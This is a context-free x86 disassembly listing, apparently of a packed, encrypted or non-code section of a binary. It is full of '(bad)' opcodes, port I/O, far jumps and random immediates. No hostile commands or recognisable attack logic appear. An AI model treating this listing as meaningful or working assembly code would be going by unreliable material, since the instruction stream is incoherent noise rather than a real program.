  415974:	ficomp DWORD PTR [ebp+0x4388a8dd]
  41597a:	popa   
  41597b:	outs   dx,DWORD PTR ds:[esi]
  41597c:	adc    bh,bh
  41597e:	nop
  41597f:	xchg   DWORD PTR ds:0x33c05161,edx
  415985:	cld    
  415986:	addr16 mov bl,0x1
  415989:	aam    0xc4
  41598b:	xchg   DWORD PTR [edx*2+0x1afeeb3],edx
  415992:	jo     0x415a0f
  415994:	mov    ecx,0x5005dc97
  415999:	mov    dl,BYTE PTR [ecx-0x6c]
  41599c:	jg     0x415946
  41599e:	dec    edx
  41599f:	push   0xffffffbc
  4159a1:	mov    esi,DWORD PTR [esp+edx*1-0x28]
  4159a5:	xor    al,0x4d
  4159a7:	cdq    
  4159a8:	jle    0x41593d
  4159aa:	inc    esp
  4159ab:	je     0x415930
  4159ad:	iret   
  4159ae:	int3   
  4159af:	inc    esp
  4159b0:	rol    DWORD PTR [ebx+0x31],cl
  4159b3:	int    0xa5
  4159b5:	pop    eax
  4159b6:	mov    DWORD PTR [edx+0x4c934ddf],ebx
  4159bc:	mov    DWORD PTR ds:0x2d2155e3,edi
  4159c2:	and    dh,BYTE PTR [edx-0x5c47583a]
  4159c8:	add    DWORD PTR [edi-0x4af07b0e],ecx
  4159ce:	and    eax,0xd8d659c4
  4159d3:	stc    
  4159d4:	cmp    BYTE PTR [edx+0x7818d387],dh
  4159da:	mov    ebx,0xea6d05b8
  4159df:	jle    0x4159ea
  4159e1:	inc    edi
  4159e2:	es push 0x9fe177f9
  4159e8:	add    al,0x4c
  4159ea:	mov    al,0x23
  4159ec:	mov    ah,0x9
  4159ee:	test   BYTE PTR [ecx],bl
  4159f0:	enter  0x902a,0xd
  4159f4:	ins    BYTE PTR es:[edi],dx
  4159f5:	cli    
  4159f6:	mov    bh,BYTE PTR [ebp+0x20]
  4159f9:	sbb    DWORD PTR [edx-0x5d695dc],ecx
  4159ff:	xor    BYTE PTR [ecx+esi*4-0xad4704],ah
  415a06:	cmp    al,0x70
  415a08:	xchg   edi,eax
  415a09:	cwde   
  415a0a:	cmp    BYTE PTR [ebx+0xbe2c0a0],bl
  415a10:	sbb    eax,0xa5e14b5b
  415a15:	shl    DWORD PTR [eax-0x2f],0x24
  415a19:	sti    
  415a1a:	loop   0x415a19
  415a1c:	inc    ebp
  415a1d:	xchg   ecx,eax
  415a1e:	push   edi
  415a1f:	adc    bh,BYTE PTR [esi-0x109bcfc8]
  415a25:	repnz mov eax,ds:0xec691a21
  415a2b:	outs   dx,DWORD PTR ds:[esi]
  415a2c:	mov    al,BYTE PTR [eax]
  415a2e:	xchg   edi,eax
  415a2f:	neg    BYTE PTR [edi-0x19]
  415a32:	(bad)  
  415a33:	jno    0x415a33
  415a35:	mov    ebx,0x3830946d
  415a3a:	mov    bh,0x18
  415a3c:	fiadd  DWORD PTR [si+0x490f]
  415a41:	ret    0x77ec
  415a44:	popa   
  415a45:	sti    
  415a46:	into   
  415a47:	imul   edi,DWORD PTR [ecx],0xffffffb5
  415a4a:	inc    ecx
  415a4b:	shl    BYTE PTR [esi+0x76d79e93],cl
  415a51:	mov    ch,0x67
  415a53:	add    BYTE PTR [ecx],bh
  415a55:	retf   
  415a56:	test   DWORD PTR [edi+0x4e],0xb5935eb3
  415a5d:	xchg   DWORD PTR [ebx+0x7e4f4e00],eax
  415a63:	arpl   WORD PTR [edx+0x166f52f1],bx
  415a69:	push   ss
  415a6a:	push   0x82cc01e5
  415a6f:	fisub  DWORD PTR [esi]
  415a71:	adc    dl,BYTE PTR [edi+0x2b]
  415a74:	sti    
  415a75:	fistp  WORD PTR [eax+ecx*1]
  415a78:	and    eax,0xf67beac1
  415a7d:	iret   
  415a7e:	stos   BYTE PTR es:[edi],al
  415a7f:	dec    esp
  415a80:	mov    dh,BYTE PTR [eax+0x583e9502]
  415a86:	loop   0x415a8f
  415a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a89:	lds    ebx,FWORD PTR [eax]
  415a8b:	scas   eax,DWORD PTR es:[edi]
  415a8c:	scas   al,BYTE PTR es:[edi]
  415a8d:	sub    al,0x16
  415a8f:	push   0x2f
  415a91:	mov    ds:0xdcfa164f,al
  415a96:	bound  ecx,QWORD PTR [ebx-0x40805477]
  415a9c:	ds hlt 
  415a9e:	push   ds
  415a9f:	loopne 0x415a6d
  415aa1:	scas   al,BYTE PTR es:[edi]
  415aa2:	xor    BYTE PTR [ebx+0x51649b65],cl
  415aa8:	and    cl,BYTE PTR [edx+eiz*1]
  415aab:	or     BYTE PTR [edi+0x12],bl
  415aae:	xor    DWORD PTR [edx],esi
  415ab0:	into   
  415ab1:	push   es
  415ab2:	mov    ds:0xdf2d325f,al
  415ab7:	mov    edi,0x1133041f
  415abc:	adc    BYTE PTR [ebx+0x29],ah
  415abf:	mov    DWORD PTR [edi+0x7],ecx
  415ac2:	popa   
  415ac3:	ret    0x4a63
  415ac6:	jnp    0x415ac7
  415ac8:	sar    BYTE PTR [edx-0x3443b607],cl
  415ace:	xchg   ecx,ebp
  415ad0:	ret    
  415ad1:	mov    edx,0x6bf1109f
  415ad6:	xchg   ebx,eax
  415ad7:	(bad)  
  415ad8:	pushf  
  415ad9:	push   0xe061c85b
  415ade:	mov    ds:0x2b62ec86,al
  415ae3:	ror    ch,0x62
  415ae6:	test   BYTE PTR [edx-0x16],ch
  415ae9:	jno    0x415b21
  415aeb:	scas   al,BYTE PTR es:[edi]
  415aec:	ja     0x415b56
  415aee:	mov    ebp,0x6f09b5d5
  415af3:	aad    0x2e
  415af5:	in     al,0x15
  415af7:	test   BYTE PTR [eax+0x7e],0xdc
  415afb:	push   gs
  415afd:	in     al,0x1d
  415aff:	das    
  415b00:	iret   
  415b01:	dec    esi
  415b02:	pusha  
  415b03:	cmp    al,0xba
  415b05:	arpl   WORD PTR [eax],cx
  415b07:	mov    ch,0xf9
  415b09:	dec    edi
  415b0a:	jmp    0x415b54
  415b0c:	call   0xa30a:0x1cf902dd
  415b13:	ss xchg edx,eax
  415b15:	mov    cl,0xbe
  415b17:	push   ss
  415b18:	add    DWORD PTR [ecx-0x51],eax
  415b1b:	das    
  415b1c:	imul   ebx,DWORD PTR [esi],0xc83037de
  415b22:	arpl   WORD PTR [ebp+0x625fa3ba],di
  415b28:	int    0x81
  415b2a:	or     eax,0x4f7f9e07
  415b2f:	push   ebp
  415b30:	test   DWORD PTR [edx-0x6c],ecx
  415b33:	(bad)
  415b37:	xor    DWORD PTR [esi-0x15],edx
  415b3a:	and    DWORD PTR [edi+0x18],eax
  415b3d:	mov    dh,0xc9
  415b3f:	and    ebx,ebp
  415b41:	es (bad) 
  415b43:	test   bl,dl
  415b45:	gs xor eax,0x83f3b9c0
  415b4b:	inc    esi
  415b4c:	xor    BYTE PTR [esi],dh
  415b4e:	dec    esi
  415b4f:	push   0xffffff93
  415b51:	mov    DWORD PTR [edx],ebx
  415b53:	lds    edi,FWORD PTR [ebp+0x37e63b5b]
  415b59:	in     al,dx
  415b5a:	and    BYTE PTR [edi+0x64f18467],al
  415b60:	xor    al,0x28
  415b62:	mov    eax,ds:0x88e53ea1
  415b67:	xor    edx,esi
  415b69:	sub    ch,bl
  415b6b:	std    
  415b6c:	out    0x5a,al
  415b6e:	xchg   DWORD PTR [edx+0x3d],ecx
  415b71:	push   ebx
  415b72:	sahf   
  415b73:	inc    ebp
  415b74:	sub    dh,BYTE PTR [ebx-0x4f]
  415b77:	fwait
  415b78:	in     al,dx
  415b79:	pop    eax
  415b7a:	pushf  
  415b7b:	daa    
  415b7c:	sbb    BYTE PTR [esi+0x3b],dl
  415b7f:	add    DWORD PTR [ebx],ecx
  415b81:	data16 sub dh,cl
  415b84:	xchg   ebp,eax
  415b85:	leave  
  415b86:	mov    BYTE PTR [ebx-0x5f01ec1e],0xec
  415b8d:	mov    WORD PTR [edi-0x5462e155],fs
  415b93:	dec    edi
  415b94:	(bad)  
  415b95:	dec    eax
  415b96:	sbb    dl,BYTE PTR [ebx+esi*2-0x4d]
  415b9a:	mov    cl,0x0
  415b9c:	and    al,0xcc
  415b9e:	xchg   DWORD PTR [ebp+0x2eeb91b0],eax
  415ba4:	stos   DWORD PTR es:[edi],eax
  415ba5:	out    dx,eax
  415ba6:	stc    
  415ba7:	xchg   dh,bh
  415ba9:	cld    
  415baa:	cmp    DWORD PTR [ebx+0x6f],esi
  415bad:	xor    eax,0xf79e42cf
  415bb2:	mov    edi,0xddb1e2bf
  415bb7:	mov    al,bl
  415bb9:	xchg   ecx,eax
  415bba:	push   esp
  415bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbc:	retf   0xe9d
  415bbf:	pop    esi
  415bc0:	adc    DWORD PTR [ecx],edx
  415bc2:	sbb    eax,0x7f137204
  415bc7:	jns    0x415bf7
  415bc9:	mul    BYTE PTR [ecx+0x65b34c0d]
  415bcf:	stos   DWORD PTR es:[edi],eax
  415bd0:	sub    al,BYTE PTR [edx]
  415bd2:	cld    
  415bd3:	xchg   esi,eax
  415bd4:	inc    edx
  415bd5:	mov    ch,0xca
  415bd7:	push   cs
  415bd8:	test   cl,ah
  415bda:	add    eax,0x8afc67e8
  415bdf:	dec    ecx
  415be0:	dec    esi
  415be1:	int3   
  415be2:	test   eax,0x2f7df1b9
  415be7:	hlt    
  415be8:	sbb    eax,0xcbc1861a
  415bed:	rol    BYTE PTR [edx-0x1a],1
  415bf0:	pop    esi
  415bf1:	sahf   
  415bf2:	adc    BYTE PTR [ebx+0x2e],al
  415bf5:	imul   edi,DWORD PTR gs:[eax+edx*8-0x506d5790],0xf59b7f67
  415c01:	cs push 0xffffff9f
  415c04:	test   BYTE PTR [esi+0x760f6734],0x84
  415c0b:	mov    dl,0x21
  415c0d:	nop
  415c0e:	test   DWORD PTR [ecx-0x3a],0x109e170b
  415c15:	jb     0x415bd7
  415c17:	js     0x415bef
  415c19:	and    bl,BYTE PTR [ebp+0x1664d851]
  415c1f:	scas   eax,DWORD PTR es:[edi]
  415c20:	sub    al,0xa7
  415c22:	adc    DWORD PTR [edx+ebx*2+0x46],esp
  415c26:	jp     0x415bd4
  415c28:	add    ebp,DWORD PTR [edx+0x6d]
  415c2b:	pop    esp
  415c2c:	or     BYTE PTR fs:[edi],dh
  415c2f:	iret   
  415c30:	xlat   BYTE PTR ds:[ebx]
  415c31:	sti    
  415c32:	xchg   esp,eax
  415c33:	sbb    ebx,DWORD PTR [eax+0x49876fb1]
  415c39:	in     eax,dx
  415c3a:	daa    
  415c3b:	xor    edx,esp
  415c3d:	jo     0x415c7b
  415c3f:	push   ecx
  415c40:	mov    bh,0x21
  415c42:	mov    edx,0x24271e5d
  415c47:	ins    DWORD PTR es:[edi],dx
  415c48:	xor    al,0xde
  415c4a:	adc    al,0x5c
  415c4c:	test   al,0xea
  415c4e:	dec    DWORD PTR [esp+ecx*8+0x4]
  415c52:	loopne 0x415c43
  415c54:	call   0x45a9fd61
  415c59:	sbb    dl,ah
  415c5b:	sbb    dl,BYTE PTR [edi+ebx*1+0xe]
  415c5f:	push   cs
  415c60:	add    BYTE PTR [ebp-0x1e],bh
  415c63:	or     ebp,DWORD PTR [ebx]
  415c65:	sahf   
  415c66:	and    al,0x5b
  415c68:	jnp    0x415cb7
  415c6a:	sub    edi,DWORD PTR [edx-0x36a65f45]
  415c70:	leave  
  415c71:	add    eax,0x284efb50
  415c76:	arpl   WORD PTR [edx-0x1a9fad9],bp
  415c7c:	nop
  415c7d:	fild   QWORD PTR [esi-0x3845f4bf]
  415c83:	inc    ecx
  415c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c85:	jmp    0x190a:0xaca67653
  415c8c:	jge    0x415c45
  415c8e:	jp     0x415ced
  415c90:	(bad)  
  415c91:	(bad)  
  415c92:	(bad)  
  415c94:	loopne 0x415c16
  415c96:	mov    ch,0x5c
  415c98:	stos   BYTE PTR es:[edi],al
  415c99:	mov    dh,0x15
  415c9b:	test   al,0xbd
  415c9d:	aad    0x96
  415c9f:	mov    ebx,0x35abaf68
  415ca4:	aaa    
  415ca5:	mov    esi,0x8bc9727f
  415caa:	sbb    ch,cl
  415cac:	lods   al,BYTE PTR ds:[esi]
  415cad:	push   esi
  415cae:	dec    bp
  415cb0:	fidiv  WORD PTR [esi+0x5a2c2c89]
  415cb6:	ds jbe 0x415d06
  415cb9:	retf   0xf2da
  415cbc:	mov    eax,0xf3fb1441
  415cc1:	in     al,0x90
  415cc3:	dec    edx
  415cc4:	out    0x5b,eax
  415cc6:	push   esi
  415cc7:	and    eax,0x173f1c16
  415ccc:	sbb    al,ah
  415cce:	xchg   esp,eax
  415ccf:	mov    ebx,0xe8ec9efa
  415cd4:	in     eax,dx
  415cd5:	out    0xc5,eax
  415cd7:	mov    esp,0xb9eff87c
  415cdc:	mov    BYTE PTR [edi+eiz*1-0x1eac047f],ch
  415ce3:	mul    cl
  415ce5:	cmp    al,0xe2
  415ce7:	fstp   DWORD PTR [eax+0x4d]
  415ceb:	mov    dl,0x5f
  415ced:	sbb    eax,0x4b8cdb42
  415cf2:	cdq    
  415cf3:	mov    ebx,0xa94ad0f9
  415cf8:	jae    0x415d75
  415cfa:	inc    edx
  415cfb:	sbb    eax,0x899400b6
  415d00:	jg     0x415ca1
  415d02:	test   al,0x69
  415d04:	(bad)  
  415d05:	pop    ebx
  415d06:	sub    dh,bh
  415d08:	adc    eax,0x85f72948
  415d0d:	lea    edx,[edx-0x5]
  415d10:	dec    ebx
  415d11:	mov    ds:0xd6e77645,al
  415d16:	inc    edx
  415d17:	loopne 0x415d18
  415d19:	jae    0x415cfd
  415d1b:	shl    BYTE PTR [ebx+edi*8],1
  415d1e:	leave  
  415d1f:	leave  
  415d20:	daa    
  415d21:	xchg   ebp,eax
  415d22:	stc    
  415d23:	mov    bh,0x62
  415d25:	inc    eax
  415d26:	pop    ebx
  415d27:	ins    DWORD PTR es:[edi],dx
  415d28:	je     0x415cef
  415d2a:	outs   dx,DWORD PTR ds:[esi]
  415d2b:	lods   eax,DWORD PTR ds:[esi]
  415d2c:	jge    0x415cee
  415d2e:	sbb    BYTE PTR [eax],ch
  415d30:	push   ebx
  415d31:	ins    DWORD PTR es:[edi],dx
  415d32:	test   DWORD PTR [ebx],0xa626b624
  415d38:	mov    bl,0xdb
  415d3a:	sub    eax,0xbd63384a
  415d3f:	loopne 0x415d73
  415d41:	jnp    0x415d8e
  415d43:	je     0x415da5
  415d45:	push   ebx
  415d46:	les    ecx,FWORD PTR [ecx+ebp*4]
  415d49:	mov    ah,0x50
  415d4b:	arpl   WORD PTR [ebp-0x40],si
  415d4e:	fimul  DWORD PTR es:[edx]
  415d51:	mov    ds,WORD PTR [esp+ebp*8-0x160c9936]
  415d58:	int3   
  415d59:	daa    
  415d5a:	rcl    ebp,0x7b
  415d5d:	out    dx,al
  415d5e:	dec    esp
  415d5f:	sub    DWORD PTR [ebx-0x46dba981],esi
  415d65:	push   edx
  415d66:	jmp    0x429c:0x5af43ecb
  415d6d:	call   0xe296:0x1ced5f9b
  415d74:	adc    esp,DWORD PTR [esp+edx*8+0x7e]
  415d78:	jo     0x415d46
  415d7a:	sbb    edx,DWORD PTR [ebp+ecx*2+0xaaac7d4]
  415d81:	sub    cl,bl
  415d83:	dec    edi
  415d84:	mov    esi,0xfd235b7b
  415d89:	(bad)  
  415d8a:	adc    DWORD PTR [esi-0x43],ebx
  415d8d:	rcr    BYTE PTR [edx-0x3e],0x34
  415d91:	inc    ebx
  415d92:	jbe    0x415d45
  415d94:	out    dx,eax
  415d95:	inc    esi
  415d96:	or     al,0x4f
  415d98:	jbe    0x415d29
  415d9a:	in     eax,0xc9
  415d9c:	push   es
  415d9d:	pop    edx
  415d9e:	(bad)  
  415d9f:	shl    DWORD PTR [esi+0x2f23bd81],cl
  415da5:	stc    
  415da6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415da8:	scas   eax,DWORD PTR es:[edi]
  415da9:	inc    ecx
  415daa:	mov    ah,0x7b
  415dac:	cmp    eax,DWORD PTR [eax-0x6e]
  415daf:	loope  0x415db9
  415db1:	add    eax,0xa1414878
  415db6:	in     eax,0x25
  415db8:	loop   0x415d68
  415dba:	or     ebp,esp
  415dbc:	(bad)  
  415dbd:	push   edi
  415dbe:	loopne 0x415db6
  415dc0:	pop    ss
  415dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dc2:	mov    eax,ds:0xd5b18100
  415dc7:	xlat   BYTE PTR ds:[ebx]
  415dc8:	fnstcw WORD PTR [edx]
  415dca:	and    BYTE PTR [ecx+0x46],al
  415dcd:	xor    DWORD PTR [esi],edi
  415dcf:	mov    cl,0x7b
  415dd1:	ins    DWORD PTR es:[edi],dx
  415dd2:	daa    
  415dd3:	inc    ebp
  415dd4:	inc    edi
  415dd5:	pop    ebp
  415dd6:	pop    eax
  415dd7:	cmp    DWORD PTR ds:0x7f6a1593,edi
  415ddd:	sub    ebp,DWORD PTR [edi+0xa]
  415de0:	popa   
  415de1:	(bad)  
  415de2:	sbb    ecx,DWORD PTR [esi+0x47]
  415de5:	cmp    BYTE PTR [ebp-0x21],dl
  415de8:	mov    al,ds:0x7aaba063
  415ded:	and    cl,dh
  415def:	jmp    0xa7ffa541
  415df4:	cmp    al,0x4f
  415df6:	clc    
  415df7:	mov    WORD PTR [edi],cs
  415df9:	sbb    DWORD PTR [edx+0x46],edx
  415dfc:	clc    
  415dfd:	movntps XMMWORD PTR [ebp+0x31663169],xmm4
  415e04:	pop    ds
  415e05:	jae    0x415e49
  415e07:	or     BYTE PTR [ecx-0x4125e02b],al
  415e0d:	stos   BYTE PTR es:[edi],al
  415e0e:	mov    ebx,0x5e955417
  415e13:	sub    eax,0xe31a981
  415e18:	bound  ecx,QWORD PTR [ecx]
  415e1a:	sar    DWORD PTR [esi],0x53
  415e1d:	add    edi,ebp
  415e1f:	test   ebx,edi
  415e21:	pop    ds
  415e22:	fidivr WORD PTR [ecx-0x4d72601c]
  415e28:	(bad)  
  415e29:	xor    eax,esi
  415e2b:	push   cs
  415e2c:	dec    esp
  415e2d:	inc    esp
  415e2e:	jmp    0x2b21:0x402350ae
  415e35:	or     al,0x40
  415e37:	xor    al,0x26
  415e39:	out    0x37,al
  415e3b:	inc    edx
  415e3c:	dec    esi
  415e3d:	popf   
  415e3e:	lea    edx,[ecx-0x65]
  415e41:	mov    ebx,0x8d58f6c6
  415e46:	mov    eax,0x7748016b
  415e4b:	(bad)  
  415e4c:	xor    dl,BYTE PTR [eiz*1-0x76d7f1ad]
  415e53:	push   edi
  415e54:	ret    0x3309
  415e57:	imul   ebp,DWORD PTR [edi+esi*4],0xeed1e34e
  415e5e:	pop    ebp
  415e5f:	xchg   esp,eax
  415e60:	test   DWORD PTR [ecx+esi*2],esp
  415e63:	mov    BYTE PTR [esi],dh
  415e65:	(bad)  
  415e66:	sbb    al,0xc2
  415e68:	outs   dx,BYTE PTR ds:[esi]
  415e69:	push   ecx
  415e6a:	imul   esp,DWORD PTR [edx],0x46
  415e6d:	nop
  415e6e:	or     BYTE PTR ds:0xe34017a8,dl
  415e74:	sub    BYTE PTR [edx+0x54],dl
  415e77:	sbb    DWORD PTR [esi+0x29],ebp
  415e7a:	pop    ds
  415e7b:	fsub   DWORD PTR [eax]
  415e7d:	fimul  WORD PTR [edi+ebp*4+0x4a]
  415e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e82:	mov    eax,DWORD PTR [ebx]
  415e84:	jmp    0xbda2:0x20591297
  415e8b:	(bad)  
  415e8c:	cli    
  415e8d:	pushf  
  415e8e:	ins    BYTE PTR es:[edi],dx
  415e8f:	lahf   
  415e90:	loopne 0x415eb8
  415e92:	jmp    0x75e0:0x5bbd0640
  415e99:	shr    BYTE PTR [edx],1
  415e9b:	shr    DWORD PTR [ebp-0x5800e243],1
  415ea1:	sub    al,0xa5
  415ea3:	out    dx,al
  415ea4:	shl    DWORD PTR [ecx+edi*1-0x51576255],0x31
  415eac:	jbe    0x415ebd
  415eae:	fisub  WORD PTR [edi-0x4d]
  415eb1:	call   0x317813cd
  415eb6:	shr    BYTE PTR [eax-0x66],cl
  415eb9:	call   0x65a0:0x78f1872f
  415ec0:	(bad)  
  415ec1:	or     BYTE PTR [ebx-0x10],bl
  415ec4:	jp     0x415f0c
  415ec6:	scas   eax,DWORD PTR es:[edi]
  415ec7:	cmp    ebx,eax
  415ec9:	push   cs
  415eca:	xchg   edx,eax
  415ecb:	fldlg2 
  415ecd:	pusha  
  415ece:	xchg   DWORD PTR [eax-0x55],esp
  415ed1:	pop    ebx
  415ed2:	push   cs
  415ed3:	xchg   DWORD PTR ds:0xf0d96518,esi
  415ed9:	outs   dx,DWORD PTR ds:[esi]
  415eda:	into   
  415edb:	xor    eax,0xa1273409
  415ee0:	(bad)  [ebp+esi*2-0x5cdbe115]
  415ee7:	dec    ecx
  415ee8:	test   al,0x23
  415eea:	pop    ebx
  415eeb:	inc    edi
  415eec:	jmp    0x90f7cf38
  415ef1:	sbb    al,0xb4
  415ef3:	dec    esp
  415ef4:	test   al,0xf3
  415ef6:	inc    ebp
  415ef7:	push   edx
  415ef8:	sub    edi,DWORD PTR [edx]
  415efa:	xchg   edx,eax
  415efb:	stos   DWORD PTR es:[edi],eax
  415efc:	aad    0xb8
  415efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eff:	cmp    al,0x9
  415f01:	bswap  eax
  415f03:	mov    eax,ds:0xfc1573ea
  415f08:	cmp    al,BYTE PTR [ebp+0x40673e8a]
  415f0e:	lods   al,BYTE PTR ds:[esi]
  415f0f:	mov    ebp,0xc74a84d0
  415f14:	xlat   BYTE PTR ds:[ebx]
  415f15:	sub    BYTE PTR [eax+ebp*2+0x43],al
  415f19:	sub    DWORD PTR [eax+eiz*8],eax
  415f1c:	lock rol DWORD PTR [edi+ebx*2],cl
  415f20:	jbe    0x415f56
  415f22:	call   0xf4dc0c65
  415f27:	(bad)  
  415f28:	xor    BYTE PTR [ebp+0x387f9a4d],cl
  415f2e:	in     al,dx
  415f2f:	addr16 push ds
  415f31:	pop    eax
  415f32:	out    dx,eax
  415f33:	popf   
  415f34:	jno    0x415f36
  415f36:	xchg   DWORD PTR [edi+ebp*4+0x288bdaa0],ebp
  415f3d:	ds sahf 
  415f3f:	int3   
  415f40:	jp     0x415ee9
  415f42:	aam    0xac
  415f44:	adc    dl,BYTE PTR [esi+0x1d]
  415f47:	lea    eax,[ecx]
  415f49:	clc    
  415f4a:	ja     0x415f7b
  415f4c:	lds    esi,FWORD PTR [ebx-0x5014b60b]
  415f52:	jecxz  0x415fc8
  415f54:	out    dx,eax
  415f55:	jle    0x415f38
  415f57:	inc    ebx
  415f58:	mov    ch,0x37
  415f5a:	mov    esp,0x48bbe876
  415f5f:	je     0x415fc5
  415f61:	std    
  415f62:	adc    BYTE PTR ds:0x9b8c2821,ch
  415f68:	mov    edx,0xdd7dfe71
  415f6d:	mov    ecx,0xdf947954
  415f72:	pop    ss
  415f73:	fdiv   QWORD PTR [edx-0xa0db8e5]
  415f79:	sub    BYTE PTR [ebx],dh
  415f7b:	or     eax,esp
  415f7d:	cmp    ch,bh
  415f7f:	repz adc DWORD PTR [eax],edi
  415f82:	inc    esi
  415f83:	adc    eax,0x6a8d0b17
  415f88:	ins    DWORD PTR es:[edi],dx
  415f89:	jg     0x415fe1
  415f8b:	jp     0x415f39
  415f8d:	xchg   edx,eax
  415f8e:	ins    DWORD PTR es:[edi],dx
  415f8f:	xchg   edi,eax
  415f90:	dec    esi
  415f91:	out    0x16,al
  415f93:	mov    bh,0xf2
  415f95:	push   ecx
  415f96:	in     eax,dx
  415f97:	cmp    al,0x18
  415f9a:	(bad)  
  415f9b:	xlat   BYTE PTR ds:[ebx]
  415f9c:	cmp    cl,BYTE PTR [ebx+eiz*8+0xc9d6731]
  415fa3:	pop    esp
  415fa4:	ds sub al,0xa2
  415fa7:	in     eax,dx
  415fa8:	mov    al,ds:0xa75b5fda
  415fad:	inc    edx
  415fae:	mov    esi,0x3ef66c57
  415fb3:	mov    dh,0xe7
  415fb5:	out    dx,eax
  415fb6:	outs   dx,BYTE PTR ds:[esi]
  415fb7:	push   esp
  415fb8:	pusha  
  415fb9:	pop    es
  415fba:	hlt    
  415fbb:	lea    ebx,[ecx-0x7fd9add4]
  415fc1:	in     eax,dx
  415fc2:	(bad)  fs:[ebx-0x143ebbbc]
  415fc9:	cdq    
  415fca:	add    ebx,DWORD PTR [edx+ecx*4]
  415fcd:	lods   eax,DWORD PTR ds:[esi]
  415fce:	out    dx,eax
  415fcf:	mov    bh,0x0
  415fd1:	out    0xd1,eax
  415fd3:	xchg   ecx,eax
  415fd4:	outs   dx,BYTE PTR ds:[esi]
  415fd5:	ret    0x95c2
  415fd8:	inc    esi
  415fd9:	mov    esi,ebx
  415fdb:	mov    ss,WORD PTR [ebx+edx*4-0x51]
  415fdf:	xlat   BYTE PTR ds:[ebx]
  415fe0:	cmp    eax,0x969a1296
  415fe5:	cmc    
  415fe6:	jg     0x415fa3
  415fe8:	dec    ecx
  415fe9:	xchg   DWORD PTR [eax+0x10af535b],ebp
  415fef:	ins    DWORD PTR es:[edi],dx
  415ff0:	inc    ecx
  415ff1:	icebp  
  415ff2:	in     eax,0xc4
  415ff4:	aam    0x46
  415ff6:	das    
  415ff7:	stc    
  415ff8:	imul   ebx,DWORD PTR [ecx],0x6e66b8b9
  415ffe:	fwait
  415fff:	or     BYTE PTR [ecx-0xd],bh
  416002:	jl     0x416038
  416004:	into   
  416005:	popa   
  416006:	mov    bh,0x84
  416008:	cmp    dh,ah
  41600a:	ins    BYTE PTR es:[edi],dx
  41600b:	xor    eax,0x887c8429
  416010:	ds add edi,esi
  416013:	mov    bh,0x97
  416015:	dec    eax
  416016:	push   edx
  416017:	stos   BYTE PTR es:[edi],al
  416018:	sub    eax,0x3fe64ba0
  41601d:	cmp    al,0x55
  41601f:	call   DWORD PTR fs:[ecx+0x76]
  416023:	stc    
  416024:	jmp    0xebbc:0xb3e3849
  41602b:	sti    
  41602c:	aas    
  41602d:	xor    eax,0x44614eba
  416032:	lods   eax,DWORD PTR ds:[esi]
  416033:	xchg   esi,eax
  416034:	cmc    
  416035:	and    ebx,eax
  416037:	call   0x79095499
  41603c:	aam    0x4e
  41603e:	popa   
  41603f:	pushaw 
  416041:	punpcklwd mm6,DWORD PTR [ecx+0x7]
  416045:	inc    esp
  416046:	cdq    
  416047:	data16 hlt 
  416049:	or     eax,0x57594bbb
  41604e:	inc    ecx
  41604f:	mov    ebx,0x26e38a65
  416054:	aam    0x9f
  416056:	(bad)  
  416058:	dec    ecx
  416059:	ja     0x4160c0
  41605b:	ret    
  41605c:	addr16 add eax,0xdb1517f7
  416062:	mov    ds:0xdca94852,al
  416067:	sbb    BYTE PTR [eax+0x5b],ah
  41606a:	ret    
  41606b:	sub    DWORD PTR [edi+ecx*2],esi
  41606e:	push   edx
  41606f:	in     al,0x60
  416071:	in     eax,dx
  416072:	jns    0x416097
  416074:	push   eax
  416075:	js     0x416064
  416077:	loopne 0x416041
  416079:	fcmovnu st,st(0)
  41607b:	clc    
  41607c:	xchg   DWORD PTR [ebx],edx
  41607e:	loope  0x4160ca
  416080:	repnz sbb ch,ah
  416083:	xor    esp,DWORD PTR [edx]
  416085:	jge    0x416034
  416087:	or     al,0x8a
  416089:	push   ss
  41608a:	(bad)  
  41608b:	pop    ebx
  41608c:	shl    BYTE PTR [esi],cl
  41608e:	fmul   DWORD PTR [ebx+0x56]
  416091:	pop    ss
  416092:	out    0x63,eax
  416094:	fnstcw WORD PTR [edx]
  416096:	jge    0x416088
  416098:	xchg   ebp,eax
  416099:	mov    esi,0x4614fffe
  41609e:	aaa    
  41609f:	push   0xffffffed
  4160a1:	inc    ebx
  4160a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160a3:	cmp    DWORD PTR [esi-0x7c25844f],esp
  4160a9:	in     eax,0x58
  4160ab:	inc    edx
  4160ac:	aam    0x28
  4160ae:	pusha  
  4160af:	add    DWORD PTR [edi],esp
  4160b1:	or     edi,DWORD PTR ds:0xf4e14c74
  4160b7:	dec    ecx
  4160b8:	xlat   BYTE PTR ds:[ebx]
  4160b9:	mov    al,ds:0x6106a751
  4160be:	popa   
  4160bf:	dec    esi
  4160c0:	test   eax,0xf9bd9c04
  4160c5:	jmp    0x416128
  4160c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160c8:	jns    0x4160fc
  4160ca:	(bad)  
  4160cb:	sub    al,0x5f
  4160cd:	mov    edi,0xa8e25fd3
  4160d2:	dec    edi
  4160d4:	addr16 and eax,0x992f643a
  4160da:	adc    dl,BYTE PTR [edx-0x19d9de6b]
  4160e0:	mov    edx,0x9bdc43c4
  4160e5:	ficomp DWORD PTR [ebx-0x684a630e]
  4160eb:	js     0x4160a6
  4160ed:	in     eax,dx
  4160ee:	sub    DWORD PTR [ebx-0x2b],edi
  4160f1:	js     0x4160cf
  4160f3:	inc    esp
  4160f4:	(bad)  
  4160f5:	cmp    eax,0x127603f5
  4160fa:	sbb    edx,DWORD PTR [edi-0x47158bb9]
  416100:	gs jecxz 0x4160e0
  416103:	pop    eax
  416104:	or     eax,0x95a0314e
  416109:	push   eax
  41610a:	cli    
  41610b:	inc    edi
  41610c:	loop   0x4160b9
  41610e:	repnz xchg edi,eax
  416110:	xchg   ebp,eax
  416111:	xchg   edi,eax
  416112:	loop   0x41614e
  416114:	jns    0x416136
  416116:	cwde   
  416117:	ret    0xa09a
  41611a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41611b:	shl    ch,1
  41611d:	or     dl,dh
  41611f:	cmc    
